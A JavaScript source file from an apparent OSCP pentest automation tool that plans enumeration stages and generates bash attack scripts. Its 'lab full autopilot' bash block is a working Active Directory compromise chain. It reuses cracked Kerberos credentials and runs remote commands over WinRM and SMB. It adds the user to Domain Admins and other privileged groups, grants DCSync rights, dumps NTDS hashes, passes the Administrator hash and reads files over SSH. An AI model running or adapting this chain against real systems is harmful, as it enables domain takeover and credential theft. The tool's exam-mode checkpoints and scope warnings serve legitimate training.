/*!
 * obol engine - cruise.js - Cruise control for the browser.
 * Supports two profiles:
 *   - 'exam' (OSCP Exam Safe): batches all safe multi-hypothesis enumeration, credential validation,
 *     offline hash cracking, and payload staging into one script per stage, then checkpoints before
 *     any shell/exploit with pre-filled Manual Strike commands.
 *   - 'lab' (Lab Full Autopilot): chains multi-hypothesis enumeration, offline cracking, credential
 *     validation, active foothold execution, and remote local.txt + proof.txt flag capture end-to-end.
 *
 * Also powers the 5-stage pipeline (Stage 1 Recon -> Stage 2 Deep Sweep & Foothold -> Stage 3 On-Host
 * Triage -> Stage 4 Post-Root Pillage -> Stage 5 Pivot & Internal Sweep) and the Handoff Debrief engine
 * (Run Stats, Paid Off vs. Ruled Out hypotheses, and Theory of the Next Script).
 *
 * Pure and Node-safe: reads nothing from OBOL.store. House style: no em or en dashes.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var P = OBOL.phases;

  var MODES = ['exam', 'lab'];

  // Fact kinds that mean "a shell / a foothold / elevated access was gained" - producing one of these
  // is always a Cruise checkpoint in exam mode, never auto-batched there.
  var FOOTHOLD_KINDS = {
    'foothold.linux': 1, 'foothold.windows': 1, 'foothold.webshell': 1,
    'access.shell': 1, 'access.admin': 1, 'access.system': 1, 'access.root': 1,
  };
  var SPRAY_RE = /spray|brute|bruteforce|hydra|medusa|ncrack|kerbrute|guess|cred-?stuff|password-?spray|nxc-arsenal/i;
  var EXPLOIT_RE = /exploit|rce|overflow|deserial|payload|revshell|reverse-?shell|eternalblue|bluekeep|zerologon|nopac|petitpotam|printnightmare|smbghost|log4shell|shellshock|struts|dirtycow|dirtypipe|pwnkit|baron-?samedit|ms\d\d-\d\d\d|cve-\d/i;
  var ATTACK_PRODUCE = {
    'persistence.domain': 1, 'persistence.windows': 1, 'persistence.linux': 1, 'lateral.movement': 1,
    'loot.ntds': 1, 'hash.krbtgt': 1, 'kerberos.tickets': 1, 'ad.computer_added': 1,
  };

  function phaseOf(action) { try { return (P && P.phaseOfAction) ? P.phaseOfAction(action) : (action.phase || ''); } catch (e) { return action.phase || ''; } }

  function producesFoothold(action) {
    var pr = (action && action.produces) || [];
    for (var i = 0; i < pr.length; i++) {
      var k = pr[i];
      if (FOOTHOLD_KINDS[k] || ATTACK_PRODUCE[k] || /^(access|foothold|session)\./.test(k) || /_confirmed$/.test(k)) return true;
    }
    return false;
  }

  function tierOf(action) {
    if (!action) return 'manual';
    var au = String(action.autonomy || '').toLowerCase();
    if (au === 'auto') return 'safe';
    if (au === 'approve') return 'active';
    if (au === 'manual') return 'manual';
    var id = action.id || '';
    if (producesFoothold(action)) return 'active';
    if (SPRAY_RE.test(id)) return 'active';
    if (EXPLOIT_RE.test(id)) return 'active';
    return 'safe';
  }

  function allowsTier(mode, tier) {
    if (mode === 'lab') return tier === 'safe' || tier === 'active';
    return tier === 'safe';
  }

  function unlocksFrom(facts, pack, producedSet, cap) {
    var out = [], locked = [];
    try { locked = OBOL.pack.lockedActions(facts, pack) || []; } catch (e) { locked = []; }
    for (var i = 0; i < locked.length && out.length < (cap || 6); i++) {
      var a = locked[i].action;
      var gates = (a.requires_all || []).concat(a.requires_any || []);
      for (var j = 0; j < gates.length; j++) {
        if (producedSet[gates[j]] && !facts.has(gates[j])) { out.push({ action: a, via: gates[j] }); break; }
      }
    }
    return out;
  }

  var GATE_TOKENS = { domain: 1, basedn: 1, dc: 1, dc_netbios: 1, dc_account: 1, user: 1, password: 1,
    nthash: 1, userlist: 1, hashfile: 1, domain_sid: 1, target_sam: 1, group: 1, ca_name: 1, template: 1,
    pfx: 1, nmap_ports: 1, krbtgt_hash: 1, dahash: 1, dauser: 1, flag_path_local: 1 };

  function cmdGated(filledCmd) {
    if (filledCmd && filledCmd.blocked) return true;
    var s = (filledCmd && filledCmd.filled) || '';
    var un = (OBOL.command && OBOL.command.unfilledTokens) ? (OBOL.command.unfilledTokens(s) || []) : [];
    for (var i = 0; i < un.length; i++) { if (GATE_TOKENS[un[i]]) return true; }
    return false;
  }

  function isBatchSafeKaliCmd(action, cmdObj, filledStr) {
    var aid = (action && action.id) || '';
    if (/^(?:flag-hunt-|windows-enum$|linux-enum$|ligolo-tunnel-pivot$|pivot-|crack-identify$)/.test(aid)) return false;
    if (action && action.locus === 'onhost') return false;
    if (cmdObj && cmdObj.locus === 'onhost') return false;
    if (OBOL.pack && typeof OBOL.pack.commandLocus === 'function' && cmdObj && OBOL.pack.commandLocus(cmdObj) === 'onhost') return false;
    var s = String(filledStr || (cmdObj && (cmdObj.run || cmdObj.cmd || cmdObj)) || '').trim();
    if (!s) return false;
    // Reject Windows/PowerShell on-target commands and interactive shells / blocking listeners
    if (/^(?:\.\\|\\\\|Get-ChildItem\b|Get-ObjectAcl\b|Convert-SidToName\b|Set-DomainUserPassword\b|Add-DomainObjectAcl\b|certutil\b|powershell\b|cmd\.exe\b|wmic\b|schtasks\b|reg\s+query\b|whoami\b|systeminfo\b|ipconfig\b)/i.test(s)) return false;
    if (/^(?:sudo\s+)?(?:evil-winrm|xfreerdp|rdesktop|msfconsole|ligolo-proxy|responder|mitm6|impacket-ntlmrelayx|ntlmrelayx\.py)\b/i.test(s)) return false;
    if (/\b(?:chisel\s+server|ligolo-proxy|nc\s+-[a-z]*l|ncat\s+-[a-z]*l|socat\s+TCP-LISTEN)\b/i.test(s)) return false;
    if (/^(?:impacket-(?:psexec|wmiexec|smbexec|mssqlclient)|(?:psexec|wmiexec|smbexec|mssqlclient)\.py)\b/i.test(s) && !/\s-(?:c|Q)\s/.test(s)) return false;
    if (/^smbclient\b/i.test(s) && !/\s-(?:L|c)\b/.test(s)) return false;
    return true;
  }

  function readyCmdIndex(action, facts, fillOpts, forBatch) {
    var filled = null;
    try { filled = OBOL.command.fillAll(action, facts, fillOpts || {}); } catch (e) { filled = null; }
    if (!filled || !filled.length) return 0;
    var cmds = (action && action.commands) || [];
    function isBad(j) {
      if (cmdGated(filled[j])) return true;
      if (forBatch && !isBatchSafeKaliCmd(action, cmds[j], filled[j] && filled[j].filled)) return true;
      return false;
    }
    var anyUngated = false;
    for (var i = 0; i < filled.length; i++) { if (!isBad(i)) { anyUngated = true; break; } }
    if (!anyUngated) return -1;
    try {
      var prefLocus = forBatch ? 'remote' : action.locus;
      var idx = OBOL.pack.preferredCommandIndex(action, prefLocus, facts || null, function (cmd, j) { return isBad(j); });
      if (typeof idx === 'number' && idx >= 0 && !isBad(idx)) return idx;
    } catch (e) {}
    for (var k = 0; k < filled.length; k++) { if (!isBad(k)) return k; }
    return -1;
  }

  function reasonFor(action, tier, mode) {
    var base;
    if (producesFoothold(action)) base = 'This move lands or escalates access. You decide before you run it.';
    else if (SPRAY_RE.test(action.id || '')) base = 'This move sprays or brute-forces credentials. Noisy, so run it deliberately.';
    else if (tier === 'manual') base = 'This move is interactive or flagged manual. Run it by hand.';
    else { var ph = phaseOf(action) || 'next-step'; base = 'This is a ' + ph + ' phase move. Review it before you run it.'; }
    if (mode === 'exam' && tier === 'active') base += ' Exam mode stops here; switch to Lab to batch past the foothold.';
    return base;
  }

  function frontierPhase(facts) {
    try {
      var fi = P.frontierIndex(facts);
      var phases = P.PHASES || ['recon', 'enum', 'creds', 'access', 'escalate', 'loot'];
      return { index: fi, name: phases[Math.min(fi, phases.length - 1)] };
    } catch (e) { return { index: 0, name: 'recon' }; }
  }

  function plan(facts, pack, opts) {
    opts = opts || {};
    var mode = (opts.mode === 'lab') ? 'lab' : 'exam';
    var cap = opts.cap || 12;
    var doneIds = opts.doneIds || {};
    pack = pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];

    var ranked = [];
    try { ranked = OBOL.pack.rankActions(facts, pack, { doneIds: doneIds }) || []; } catch (e) { ranked = []; }

    var fp = frontierPhase(facts);
    var fillOpts = opts.fill || {};
    var batch = [], checkpoint = null, produced = {};

    for (var i = 0; i < ranked.length; i++) {
      var a = ranked[i];
      var tier = tierOf(a);
      if (!allowsTier(mode, tier)) {
        if (!checkpoint) checkpoint = { action: a, tier: tier, reason: reasonFor(a, tier, mode) };
        continue;
      }
      var idx = readyCmdIndex(a, facts, fillOpts, true);
      if (idx < 0) {
        if (!checkpoint && readyCmdIndex(a, facts, fillOpts, false) >= 0) {
          checkpoint = { action: a, tier: tier, reason: reasonFor(a, tier, mode) };
        }
        continue;
      }
      if (batch.length < cap) {
        batch.push({ action: a, cmdIndex: idx, tier: tier });
        (a.produces || []).forEach(function (k) { produced[k] = 1; });
      }
    }

    var unlocks = unlocksFrom(facts, pack, produced, 6);

    return {
      mode: mode,
      phase: fp.name,
      frontier: fp.index,
      batch: batch,
      unlocks: unlocks,
      checkpoint: checkpoint,
      counts: { batch: batch.length, unlocks: unlocks.length, ready: ranked.length },
    };
  }

  // -- legacy / smoke-tested script builder ---------------------------------------------------------
  var VAR_ORDER = ['TARGET', 'DOMAIN', 'USER', 'PASS', 'NTHASH', 'LHOST', 'LPORT'];
  function shellEsc(s) { return String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/`/g, '\\`').replace(/\$/g, '\\$'); }
  function oneLine(s) { return String(s == null ? '' : s).replace(/[\r\n]+/g, ' '); }
  function markerSafe(s) { return String(s == null ? '' : s).replace(/[^A-Za-z0-9 _.:\/-]/g, ''); }

  function buildScript(batch, ctx) {
    ctx = ctx || {};
    var pack = ctx.pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];
    var items = OBOL.playbook.resolve((batch || []).map(function (b) {
      return { id: b.action.id, idx: b.cmdIndex || 0 };
    }), pack);
    var params = ctx.params || {};
    var opts = { params: params, profile: ctx.profile, workspace: ctx.workspace };
    var mode = (ctx.mode === 'lab') ? 'lab' : 'exam';

    var usedAll = {}, body = [], n = 0;
    items.forEach(function (it) {
      var r = OBOL.playbook.renderLine(it, ctx.facts, opts);
      if (!r.run) return;
      n++;
      Object.keys(r.used).forEach(function (V) { usedAll[V] = 1; });
      body.push('echo "===== OBOL STEP ' + n + ': ' + markerSafe(it.id) + ' ' + markerSafe(r.run) + ' ====="');
      var note = it.note ? ('   # ' + oneLine(it.note)) : '';
      body.push('# [' + n + '] ' + oneLine(it.title) + note);
      body.push(r.run);
      body.push('');
    });

    var valOf = {
      TARGET: params.target, DOMAIN: params.domain, USER: params.username || params.user,
      PASS: params.password, NTHASH: params.nthash, LHOST: params.lhost, LPORT: params.lport,
    };
    var varLines = VAR_ORDER.filter(function (V) { return usedAll[V]; }).map(function (V) {
      var val = valOf[V];
      return V + '="' + (val ? shellEsc(val) : ('<' + V.toLowerCase() + '>')) + '"';
    });
    var stamp = (function () { try { return new Date().toISOString().slice(0, 16).replace('T', ' '); } catch (e) { return ''; } })();
    var head = [
      '#!/usr/bin/env bash',
      '# obol cruise' + (ctx.phase ? (': ' + markerSafe(ctx.phase) + ' batch') : '') + ' [' + mode + ' mode]',
      '# Generated ' + stamp + ' UTC. obol generates command text only, it never runs anything.',
      '# Review every command, confirm the target is in scope, and run each step yourself. Then paste',
      '# the whole output back into obol (Cruise) and the next batch generates. Steps are fenced with',
      '# "===== OBOL STEP n =====" markers so the paste self-segments.',
      (mode === 'lab'
        ? '# LAB MODE: this batch may push past a foothold. It is NOT exam-legal, do not use it in the OSCP exam.'
        : '# EXAM MODE: safe enumeration only. You decide before anything that lands a shell or sprays creds.'),
      'set -o pipefail',
      '',
    ];
    if (varLines.length) head = head.concat(varLines, ['']);
    head = head.concat([
      'LOG="obol-cruise-$(date +%Y%m%d-%H%M%S).log"',
      'exec > >(tee -a "$LOG") 2>&1',
      '',
    ]);
    return head.join('\n') + body.join('\n') + '\n';
  }

  // -- 5-Stage Multi-Hypothesis Autopilot & Handoff Engine ------------------------------------------

  var STAGES = [
    {
      num: 1,
      id: 'recon',
      phase: 'recon',
      badge: 'STAGE 1',
      label: 'Multi-Hypothesis Recon & Triage',
      where: 'Kali (.sh)',
      ext: '.sh',
      sum: 'Exhausts initial discovery in one run: fast all-TCP + top-UDP Nmap, NSE vuln/default scripts, FTP anon, SSH banner, DNS AXFR, SMB null/guest/RID-brute/enum4linux, LDAP rootDSE + anon dump + AS-REP check, HTTP headers/robots/.git/tech/dirs/extensions, NFS, SNMP, and DB unauth checks.',
      pills: ['All-TCP + Top-UDP Nmap', 'SMB Null/Guest/RID/Vuln', 'HTTP Tech + Dirs + .bak/.git', 'LDAP RootDSE + Anon + AS-REP', 'FTP / NFS / SNMP / DB'],
    },
    {
      num: 2,
      id: 'enum',
      phase: 'enum',
      badge: 'STAGE 2',
      label: 'Deep Sweep, Cred Crack & Foothold',
      where: 'Kali (.sh)',
      ext: '.sh',
      sum: 'Executes all unlocked frontier moves plus deep fallback waves (vhost/parameter fuzzing, share spidering, BloodHound, ADCS certipy, Kerberoast/AS-REP + rockyou auto-crack, multi-service cred validation, and in Lab mode automatic remote foothold + flag capture).',
      pills: ['Dynamic Frontier Moves', 'Deep Vhost & Share Spider', 'Roast + Offline Auto-Crack', 'Multi-Service Cred Matrix', 'Lab Auto-Foothold & Flags'],
    },
    {
      num: 3,
      id: 'foothold',
      phase: 'escalate',
      badge: 'STAGE 3',
      label: 'On-Host Triage & local.txt',
      where: 'Kali (.sh) -> Target',
      ext: '.sh',
      sum: 'Connects from Kali to the target (or provides a target shell one-liner): captures local.txt + whoami + IP proof block, sweeps kernel/sudo/SUID/capabilities/cron or Windows token privs/services/registry/stored creds, and maps internal routes/ARP.',
      pills: ['local.txt + Proof Block', 'Kernel & Package CVEs', 'Sudo / SUID / Token Privs', 'Config & Stored Creds', 'Internal Routes & ARP'],
    },
    {
      num: 4,
      id: 'loot',
      phase: 'loot',
      badge: 'STAGE 4',
      label: 'Post-Root Proof, Pillage & Interactive Host Shell',
      where: 'Kali (.sh) -> Target',
      ext: '.sh',
      sum: 'Logs onto the target from Kali as Administrator/root to capture proof.txt + local.txt + whoami + ipconfig/ip a proof block, dumps SAM/LSA/NTDS or /etc/shadow, and drops you into an interactive host shell (evil-winrm / psexec / ssh) for OSCP exam screenshots.',
      pills: ['Interactive Host Shell', 'proof.txt + local.txt Proof', 'SAM / LSA / NTDS Dump', 'Internal Subnet Check'],
    },
    {
      num: 5,
      id: 'pivot',
      phase: 'loot',
      badge: 'STAGE 5',
      label: 'Zero-Config Pivot & Internal Sweep',
      where: 'Kali + Target',
      ext: '.sh',
      sum: 'Auto-negotiates the best tunnel (sshuttle -> Ligolo-ng -> Chisel -> SSH SOCKS) into discovered internal subnets so you can select the new CIDR in the Scope Bar and launch Stage 1 against internal hosts.',
      pills: ['Auto-Detect tun0 & Port', 'sshuttle / Ligolo / Chisel', 'OS-Matched Target Agent', 'Internal Subnet Routing'],
    },
  ];

  function detectTargetOs(facts) {
    if (!facts || typeof facts.has !== 'function') return 'auto';
    try {
      if (OBOL.pack && typeof OBOL.pack.hostOsFamily === 'function') {
        var fam = OBOL.pack.hostOsFamily(facts);
        if (fam === 'linux' || fam === 'windows') return fam;
      }
    } catch (e) {}
    if (facts.has('foothold.linux') || facts.has('os.linux')) return 'linux';
    if (facts.has('foothold.windows') || facts.has('os.windows') || facts.has('winrm.authenticated') || facts.has('rdp.authenticated') || facts.has('ad.dc_candidate')) return 'windows';
    return 'auto';
  }

  function hasFoothold(facts) {
    if (!facts || typeof facts.has !== 'function') return false;
    return !!(facts.has('foothold.linux') || facts.has('foothold.windows') || facts.has('foothold.webshell') || facts.has('access.shell') || facts.has('winrm.authenticated'));
  }

  function hasAdminOrRoot(facts) {
    if (!facts || typeof facts.has !== 'function') return false;
    return !!(facts.has('access.root') || facts.has('access.system') || facts.has('access.admin'));
  }

  function hasPrivescLeads(facts) {
    if (!facts || typeof facts.has !== 'function') return false;
    var kinds = [
      'privesc.sudo_rights', 'privesc.sudo_binary', 'privesc.suid_candidate', 'privesc.capability',
      'privesc.cron_writable', 'privesc.scheduled_task', 'privesc.passwd_writable', 'privesc.docker_group',
      'privesc.lxd_group', 'privesc.kernel_exploit', 'vuln.dirtycow', 'vuln.dirtypipe', 'vuln.baron_samedit',
      'vuln.polkit', 'privesc.windows_privilege', 'privesc.always_install_elevated',
      'privesc.unquoted_service_path', 'privesc.weak_service_permission', 'privesc.stored_credentials',
    ];
    for (var i = 0; i < kinds.length; i++) { if (facts.has(kinds[i])) return true; }
    return false;
  }

  function hasPivotLeads(facts) {
    if (!facts || typeof facts.has !== 'function') return false;
    return !!(facts.has('host.multihomed') || facts.has('network.subnet_candidate') || facts.has('pivot.candidate'));
  }

  function manualCheckpoints(facts, pack, opts) {
    opts = opts || {};
    if (facts && typeof facts.has === 'function' && (facts.has('objective.local_flag') || facts.has('objective.flag')) && facts.has('objective.root_flag') && hasAdminOrRoot(facts)) {
      return { foothold: [], escalate: [], lateral: [], all: [] };
    }
    pack = pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];
    var fillOpts = opts.fill || {};
    var osFam = detectTargetOs(facts);
    var ranked = [];
    try { ranked = OBOL.pack.rankActions(facts, pack, { doneIds: opts.doneIds || {} }) || []; } catch (e) { ranked = []; }

    var foothold = [], escalate = [], lateral = [], all = [];
    for (var i = 0; i < ranked.length; i++) {
      var a = ranked[i];
      if (!a || /persistence|golden-ticket|silver-ticket|skeleton-key|dsrm/i.test(a.id || '')) continue;
      if ((a.produces || []).some(function (k) { return /persistence/.test(k); })) continue;
      if (osFam === 'windows' && /linux/i.test(a.id || '')) continue;
      if (osFam === 'linux' && /windows/i.test(a.id || '')) continue;
      var tier = tierOf(a);
      var batchIdx = readyCmdIndex(a, facts, fillOpts, true);
      if (tier === 'safe' && batchIdx >= 0) continue;
      var idx = readyCmdIndex(a, facts, fillOpts, false);
      if (idx < 0) continue;
      var filledCmd = '';
      try {
        var fa = OBOL.command.fillAll(a, facts, fillOpts);
        filledCmd = (fa && fa[idx] && fa[idx].filled) || a.command || '';
      } catch (e) { filledCmd = a.command || ''; }
      if (!filledCmd) continue;

      var pr = a.produces || [];
      var ph = phaseOf(a);
      var item = {
        action: a,
        cmdIndex: idx,
        command: filledCmd,
        tier: tier,
        phase: ph,
        reason: reasonFor(a, tier, 'exam'),
      };
      all.push(item);

      var isEsc = ph === 'escalate' || ph === 'privesc' || pr.some(function (k) { return k === 'access.root' || k === 'access.system' || (k === 'access.admin' && hasFoothold(facts)); });
      var isLat = pr.some(function (k) { return ATTACK_PRODUCE[k]; });
      var isFoot = !isEsc && (ph === 'access' || pr.some(function (k) { return FOOTHOLD_KINDS[k] || /^(access|foothold|session)\./.test(k) || /_confirmed$/.test(k); }) || EXPLOIT_RE.test(a.id || ''));

      if (isEsc && escalate.length < 4) escalate.push(item);
      else if (isFoot && foothold.length < 4) foothold.push(item);
      else if (isLat && lateral.length < 4) lateral.push(item);
    }

    return { foothold: foothold, escalate: escalate, lateral: lateral, all: all };
  }

  function planStages(facts, pack, opts) {
    opts = opts || {};
    var mode = (opts.mode === 'lab') ? 'lab' : 'exam';
    pack = pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];
    var osFam = detectTargetOs(facts);
    var portsKnown = !!(facts && (facts.has('scan.ports.open') || facts.has('ports.open')));
    var foothold = hasFoothold(facts);
    var adminRoot = hasAdminOrRoot(facts);
    var localFlag = !!(facts && (facts.has('objective.local_flag') || facts.has('objective.flag')));
    var rootFlag = !!(facts && facts.has('objective.root_flag'));
    var privescTriaged = !!(facts && (facts.has('host.kernel') || hasPrivescLeads(facts)));
    var pivotReady = hasPivotLeads(facts);
    var pivotActive = !!(facts && facts.has('pivot.active'));

    var examPlan = plan(facts, pack, { mode: mode, doneIds: opts.doneIds, fill: opts.fill, cap: 20 });
    var checkpoints = manualCheckpoints(facts, pack, opts);

    var activeStageId = 'recon';
    if (rootFlag && pivotReady && !pivotActive) {
      activeStageId = 'pivot';
    } else if (adminRoot) {
      activeStageId = 'loot';
    } else if (foothold) {
      activeStageId = 'foothold';
    } else if (portsKnown) {
      activeStageId = 'enum';
    } else {
      activeStageId = 'recon';
    }

    var stageIdxMap = { recon: 0, enum: 1, foothold: 2, loot: 3, pivot: 4 };
    var activeIdx = stageIdxMap[activeStageId] || 0;

    var stages = STAGES.map(function (st) {
      var status = 'upcoming';
      if (st.id === 'recon') {
        status = portsKnown ? (activeIdx === 0 ? 'active' : 'done') : 'active';
      } else if (st.id === 'enum') {
        if (foothold || adminRoot) status = 'done';
        else if (activeIdx === 1) status = 'active';
        else if (portsKnown) status = 'ready';
      } else if (st.id === 'foothold') {
        if (adminRoot || (foothold && localFlag && privescTriaged)) status = (activeIdx === 2) ? 'active' : 'done';
        else if (activeIdx === 2) status = 'active';
        else if (foothold) status = 'ready';
      } else if (st.id === 'loot') {
        if (rootFlag) status = 'done';
        else if (activeIdx === 3) status = 'active';
        else if (adminRoot) status = 'ready';
      } else if (st.id === 'pivot') {
        if (pivotActive) status = 'done';
        else if (activeIdx === 4) status = 'active';
        else if (pivotReady) status = 'ready';
      }
      return {
        num: st.num,
        id: st.id,
        phase: st.phase,
        badge: st.badge,
        label: st.label,
        where: st.where,
        ext: '.sh',
        sum: st.sum,
        pills: st.pills.slice(),
        status: status,
      };
    });

    return {
      mode: mode,
      activeStageId: activeStageId,
      activeIndex: activeIdx,
      osFamily: osFam,
      stages: stages,
      examPlan: examPlan,
      checkpoints: checkpoints,
      flags: { local: localFlag, root: rootFlag },
      hasPivot: pivotReady,
      pivotActive: pivotActive,
    };
  }

  // Reusable bash block for Lab Mode automatic remote foothold + local.txt/proof.txt capture
  function labAutoFootholdAndFlagsBash() {
    return [
      '# -- LAB FULL AUTOPILOT: In-Script Credential Harvest, Validation & Auto-Flag Capture --',
      '# If USER/PASS are still empty, check if earlier steps cracked a hash in cracked-users.txt or john.pot',
      'if [ -z "$PASS" ]; then',
      '  if [ -s "loot/cracked-users.txt" ]; then',
      '    ASREP_SHOW=$(grep -i \'^\\$krb5asrep\\$\' loot/cracked-users.txt 2>/dev/null | tail -n 1)',
      '    if [ -n "$ASREP_SHOW" ]; then',
      '      [ -z "$USER" ] && USER=$(echo "$ASREP_SHOW" | sed -E \'s/^\\$krb5asrep\\$([0-9]+\\$)?([^@:$]+).*/\\2/\')',
      '      PASS="${ASREP_SHOW##*:}"',
      '    fi',
      '    if [ -z "$PASS" ]; then',
      '      TGS_SHOW=$(grep -i \'^\\$krb5tgs\\$\' loot/cracked-users.txt 2>/dev/null | tail -n 1)',
      '      if [ -n "$TGS_SHOW" ]; then',
      '        [ -z "$USER" ] && USER=$(echo "$TGS_SHOW" | sed -E \'s/^\\$krb5tgs\\$([0-9]+\\$)?\\*?([^@:$*]+).*/\\2/\')',
      '        PASS="${TGS_SHOW##*:}"',
      '      fi',
      '    fi',
      '  fi',
      '  if [ -z "$PASS" ] && [ -s "loot/john.pot" ]; then',
      '    POT_LINE=$(grep -iE \'^\\$krb5(asrep|tgs)\\$\' loot/john.pot 2>/dev/null | tail -n 1)',
      '    if [ -n "$POT_LINE" ]; then',
      '      PASS="${POT_LINE##*:}"',
      '      if [ -z "$USER" ]; then',
      '        USER=$(grep -hiE \'^\\$krb5(asrep|tgs)\\$\' loot/asrep*.txt loot/kerberoast*.txt loot/*hash* 2>/dev/null | head -n 1 | sed -E \'s/^\\$krb5(asrep|tgs)\\$([0-9]+\\$)?\\*?([^@:$*]+).*/\\3/\')',
      '      fi',
      '    fi',
      '  fi',
      '  if [ -z "$PASS" ]; then',
      '    CRACKED_LINE=$(grep -hE \'^[^:?][^:]*:[^:]+$\' loot/cracked-users.txt loot/*.pot* scans/*.pot* 2>/dev/null | grep -hvE \'^\\$|^\\?|^0[[:space:]]+password\' | head -n 1)',
      '    if [ -n "$CRACKED_LINE" ]; then',
      '      [ -z "$USER" ] && USER="${CRACKED_LINE%%:*}"',
      '      PASS="${CRACKED_LINE#*:}"',
      '    fi',
      '  fi',
      'fi',
      'if [[ "$USER" == \\$krb5asrep\\$* ]]; then',
      '  USER=$(echo "$USER" | sed -E \'s/^\\$krb5asrep\\$([0-9]+\\$)?([^@:$]+).*/\\2/\')',
      'elif [[ "$USER" == \\$krb5tgs\\$* ]]; then',
      '  USER=$(echo "$USER" | sed -E \'s/^\\$krb5tgs\\$([0-9]+\\$)?\\*?([^@:$*]+).*/\\2/\')',
      'fi',
      'USER="${USER%%@*}"',
      '',
      'if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; }; then',
      '  echo "===== OBOL STEP 92: lab-auto-foothold nxc winrm ssh $TARGET ====="',
      '  echo "[obol-lab] Testing credentials ($USER) for automatic shell execution and flag capture on $TARGET..."',
      '  WIN_CMD=\'whoami & hostname & ipconfig & (for /r C:\\Users %F in (local.txt user.txt proof.txt root.txt) do @if exist "%F" (echo ===FLAG:%F:: & type "%F" & echo.)) & ver & systeminfo & whoami /all & route print & arp -a\'',
      '  WIN_PS=\'whoami; hostname; ipconfig; Get-ChildItem C:\\Users -Include local.txt,user.txt,proof.txt,root.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "===FLAG:" + $_.FullName + "::" + (Get-Content $_.FullName -Raw).Trim() }; route print; arp -a\'',
      '  if command -v nxc >/dev/null 2>&1; then',
      '    if [ -n "$NTHASH" ]; then',
      '      OUT92=$(nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_CMD" 2>&1 || true)',
      '      echo "$OUT92"',
      '      if ! echo "$OUT92" | grep -q "===FLAG:"; then',
      '        nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -X "$WIN_PS" 2>&1 || nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_CMD" --sam --lsa 2>&1 || true',
      '      fi',
      '    else',
      '      OUT92=$(nxc winrm "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_CMD" 2>&1 || true)',
      '      echo "$OUT92"',
      '      if ! echo "$OUT92" | grep -q "===FLAG:"; then',
      '        nxc winrm "$TARGET" -u "$USER" -p "$PASS" -X "$WIN_PS" 2>&1 || nxc smb "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_CMD" --sam --lsa 2>&1 || true',
      '      fi',
      '    fi',
      '  fi',
      '  DOM_USE="${DOMAIN:-$DOMAIN_HINT}"',
      '  if [ -n "$PASS" ] && [ -n "$DOM_USE" ] && command -v bloodyAD >/dev/null 2>&1; then',
      '    if [ ! -s "scans/bloodyad-writable-$TARGET.txt" ]; then',
      '      echo "===== OBOL STEP 93: bloodyad-acl bloodyAD get writable $TARGET ====="',
      '      bloodyAD -d "$DOM_USE" --host "$TARGET" -u "$USER" -p "$PASS" get writable 2>&1 | tee "scans/bloodyad-writable-$TARGET.txt" || true',
      '    fi',
      '    if grep -qiE "distinguishedName:" "scans/bloodyad-writable-$TARGET.txt" 2>/dev/null; then',
      '      echo "===== OBOL STEP 94: bloodyad-acl bloodyAD add groupMember $TARGET ====="',
      '      for G in "Domain Admins" "Enterprise Admins" "Administrators" "Exchange Windows Permissions" "Account Operators" "Organization Management" "Backup Operators" "Server Operators" "Dnsadmins"; do',
      '        bloodyAD -d "$DOM_USE" --host "$TARGET" -u "$USER" -p "$PASS" add groupMember "$G" "$USER" 2>/dev/null && echo "[+] JOINED: $G"',
      '      done',
      '      echo "===== OBOL STEP 95: bloodyad-acl bloodyAD add dcsync $TARGET ====="',
      '      bloodyAD -d "$DOM_USE" --host "$TARGET" -u "$USER" -p "$PASS" add dcsync "$USER" 2>&1 || true',
      '      if command -v impacket-secretsdump >/dev/null 2>&1; then',
      '        echo "===== OBOL STEP 96: dcsync impacket-secretsdump -just-dc $TARGET ====="',
      '        impacket-secretsdump "${DOM_USE}/${USER}:${PASS}@${TARGET}" -just-dc 2>&1 | tee "loot/ntds-$TARGET.txt" || true',
      '        ADMIN_HASH=$(strip_ansi < "loot/ntds-$TARGET.txt" 2>/dev/null | grep -iE \'^(.*\\\\)?Administrator:500:\' | cut -d: -f4 | head -n 1)',
      '        if [ -n "$ADMIN_HASH" ] && command -v nxc >/dev/null 2>&1; then',
      '          echo "===== OBOL STEP 97: pass-the-hash nxc winrm Administrator -H $TARGET ====="',
      '          nxc winrm "$TARGET" -u Administrator -H "$ADMIN_HASH" -x "$WIN_CMD" 2>&1 || nxc smb "$TARGET" -u Administrator -H "$ADMIN_HASH" -x "$WIN_CMD" 2>&1 || true',
      '        fi',
      '      fi',
      '    fi',
      '  fi',
      '  if [ -n "$PASS" ] && command -v sshpass >/dev/null 2>&1 && nc -z -w 2 "$TARGET" 22 2>/dev/null; then',
      '    PASS_ESC=$(printf "%s" "$PASS" | sed "s/\'/\'\\\\\\\\\'\'/g")',
      '    LIN_CMD=\'whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /home /root /var /srv /opt -maxdepth 3 \\( -name "local.txt" -o -name "user.txt" -o -name "proof.txt" -o -name "root.txt" \\) 2>/dev/null); do v=$(tr -d "\\r\\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; uname -a; cat /etc/os-release 2>/dev/null; sudo -n -l 2>&1 || true; printf "%s\\n" \'\\\'\'"$PASS_ESC"\'\\\'\' | sudo -S -l 2>&1 || true; ip route 2>/dev/null; ip neigh 2>/dev/null\'',
      '    timeout 25 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$USER@$TARGET" "$LIN_CMD" 2>&1 || true',
      '  fi',
      'fi',
    ].join('\n');
  }

  function validTarget(value) {
    var target = String(value || '').trim();
    if (!target || target.length > 253) return false;
    var ipv4 = /^(\d{1,3}(?:\.\d{1,3}){3})(?:\/(\d{1,2}))?$/.exec(target);
    if (ipv4) return ipv4[1].split('.').every(function (n) { return Number(n) <= 255; }) && (ipv4[2] === undefined || Number(ipv4[2]) <= 32);
